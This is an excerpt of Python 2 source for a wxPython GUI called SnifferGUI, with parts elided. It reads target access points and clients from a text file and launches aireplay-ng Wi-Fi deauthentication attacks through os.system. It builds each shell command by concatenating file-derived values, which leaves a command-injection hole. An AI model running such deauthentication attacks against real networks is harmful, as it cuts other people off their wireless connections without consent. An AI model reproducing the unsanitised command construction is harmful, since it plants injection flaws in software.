...
class SnifferGUI(wx.Frame):
	...
	def InitUI(self):
		...
		if not os.path.exists('./Modules/deauth_ssid_client.txt'):
			os.system('touch ./Modules/deauth_ssid_client.txt')
		
		myfiles = open('./Modules/deauth_ssid_client.txt','r').readlines()	
		...
		#~ self.on_timer()
	def closeMe(self, e):
		os.system('echo "" > ./Modules/deauth_ssid_client.txt')
		self.Close()
	...
	def executeCommand(self,e):
		...
		try:
			...
			if attackInterface == 'mon0':
				...
				os.system("gnome-terminal -x aireplay-ng --deauth "+str(int(myslider))+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[2])+" -c "+str(ssidsplitter[1])+" "+attackInterface+" --ignore-negative-one")
				...
				os.system("gnome-terminal -x aireplay-ng --deauth "+str(int(myslider))+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[2])+" -c "+str(ssidsplitter[1])+" mon0 --ignore-negative-one")
				print "gnome-terminal -x aireplay-ng --deauth "+str(int(myslider))+" -a "+ssidsplitter[0]+" -e "+str(ssidsplitter[2])+" -c "+str(ssidsplitter[1])+" mon0 --ignore-negative-one"
